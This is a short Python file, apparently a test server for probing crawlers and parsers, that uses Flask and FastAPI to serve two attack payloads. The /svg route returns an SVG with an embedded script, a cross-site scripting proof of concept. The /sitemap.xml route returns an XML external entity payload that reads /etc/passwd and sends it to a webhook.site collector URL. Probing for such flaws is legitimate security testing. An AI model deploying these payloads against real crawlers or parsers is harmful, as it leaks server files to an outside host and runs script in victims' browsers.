from flask import Flask, Response
from fastapi import FastAPI
from starlette.middleware.wsgi import WSGIMiddleware
from fastapi.responses import Response as FastResponse

flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return "Hello, World!"

@flask_app.route("/svg")
def svg():
    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.domain)</script>
</svg>"""
    return Response(svg_content, mimetype="image/svg+xml")

app = FastAPI()
app.mount("/", WSGIMiddleware(flask_app))

@app.get("/sitemap.xml")
def sitemap():
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE urlset [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
    <url>
        <loc>https://webhook.site/371086e9-abd3-4e87-bf64-01031f74dc96/?abc=&xxe;</loc>
        <lastmod>2025-07-30</lastmod>
        <changefreq>daily</changefreq>
        <priority>1.0</priority>
    </url>
</urlset>
"""
    return FastResponse(content=xml_content, media_type="application/xml")
